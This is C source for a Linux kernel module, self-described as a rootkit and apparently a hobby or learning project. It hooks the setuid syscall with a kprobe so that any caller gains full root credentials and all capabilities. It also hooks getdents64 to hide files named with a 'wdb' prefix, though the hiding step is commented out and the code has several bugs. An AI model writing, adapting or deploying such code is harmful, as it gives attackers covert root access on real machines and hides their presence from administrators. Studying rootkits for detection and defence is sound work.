#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/capability.h>
#include <linux/sched.h>
#include <linux/kprobes.h>
#include <linux/atomic.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>

#include <linux/uaccess.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("otitoko");
MODULE_DESCRIPTION("Rootkit");
MODULE_VERSION("0.1");

atomic_t hooked = ATOMIC_INIT(0);

#define PREFIX "wdb"
#define MAGIC_UID 50

#define _GLOBAL_ROOT_UID 0
#define _GLOBAL_ROOT_GID 0



void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsigned long flags)
{
    printk(KERN_INFO "setuid hook called, elevating privs...");

    struct cred *new_creds = prepare_creds();

    new_creds->uid.val=_GLOBAL_ROOT_UID;
    new_creds->euid.val=_GLOBAL_ROOT_UID;
    new_creds->suid.val=_GLOBAL_ROOT_UID;
    new_creds->fsuid.val=_GLOBAL_ROOT_UID;

    new_creds->gid.val=_GLOBAL_ROOT_GID;
    new_creds->egid.val=_GLOBAL_ROOT_GID;
    new_creds->sgid.val=_GLOBAL_ROOT_GID;
    new_creds->fsgid.val=_GLOBAL_ROOT_GID;

    new_creds->cap_inheritable=CAP_FULL_SET;
    new_creds->cap_permitted=CAP_FULL_SET;
    new_creds->cap_effective=CAP_FULL_SET;
    new_creds->cap_bset=CAP_FULL_SET;
    commit_creds(new_creds);
}
/* Hiding our files from ls */

/* struct for info to be passed from entry handler to post handler */
static struct getdents_data{
    unsigned long d_name_ptr;
}dentry_data;

static int __x64_sys_getdents64_pre_handler(struct kprobe *getdents_kprobe, struct pt_regs *regs){
    printk(KERN_INFO "Executing __x64_sys_getdents64_pre_handler... ");
}

static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, struct pt_regs *regs){

	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;


	struct linux_dirent64 *current_dir,*kbuf = NULL;
	unsigned long offset = 0;

	int ret = regs_return_value(regs);
	printk(KERN_INFO "getdents returned %d bytes", ret);
	kbuf = kzalloc(ret, GFP_KERNEL);
	if(!kbuf){
		printk(KERN_ERR "memalloc failed");
		}
	printk(KERN_DEBUG "mem allocated: %ld bytes",ret);

	if( (ret<=0) || (kbuf == NULL) )
		return ret;


	if(!access_ok(dirent,ret)){
		printk(KERN_ERR "access not ok");
	}

	long error = copy_from_user(kbuf,dirent,ret);
	if(error){
		printk(KERN_ERR "could not copy %ld bytes from user",ret);
		printk(KERN_ERR "copy_from_user error: %ld",error);
		goto done;
	}


	while(offset<ret){
		current_dir = (void *)kbuf+offset;
	//	struct linux_dirent64 *d = (struct linux_dirent64 *)(kbuf+offset);
		//printk(KERN_INFO "File: %s",d->d_name);
	/*	if(strcmp(d->d_name, "file_to_be_hidden")!=0){
			memmove(kbuf+new_len, d, d->d_reclen);
			new_len+=d->d_reclen;
		}*/

		if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX))==0){
			printk(KERN_DEBUG "rootkit found: %s", current_dir->d_name);
		}
	offset += current_dir->d_reclen;
	}
	/*
	   if(copy_to_user(user_dirent,kbuf,new_len)==0){
	   regs->ax=new_len;
	   }else{
	   printk(KERN_ERR "copy_to_user failed");
	   }
	   */
done:
    kfree(kbuf);
    return 0;
}
static struct kretprobe  __x64_sys_getdents64_hook= {
    .pre_handler = __x64_sys_getdents64_pre_handler,
	.handler = __x64_sys_getdents64_post_handler,
	.kp.symbol_name="__x64_sys_getdents64",
	.maxactive=20,
};


struct kprobe __x64_sys_setuid_hook = {
        .symbol_name = "__x64_sys_setuid",
        .post_handler = __x64_sys_setuid_post_handler,
};

static int __init rkin(void)
{
    printk(KERN_INFO "module loaded\n");
    int setuid_registered = register_kprobe(&__x64_sys_setuid_hook);
    int getdents64_registered = register_kretprobe(&__x64_sys_getdents64_hook);
    if (setuid_registered < 0 || getdents64_registered < 0)
    {
        printk(KERN_INFO "failed to register setuid kprobes\n");
    }
    else
    {
        printk(KERN_INFO "hooks registered\n");
        atomic_inc(&hooked);
    }

    return 0;
}

static void __exit rkout(void)
{
    if (atomic_read(&hooked))
    {
	unregister_kretprobe(&__x64_sys_getdents64_hook);
        unregister_kprobe(&__x64_sys_setuid_hook);
        printk(KERN_INFO "unhooked\n");
    }
}

module_init(rkin);
module_exit(rkout);

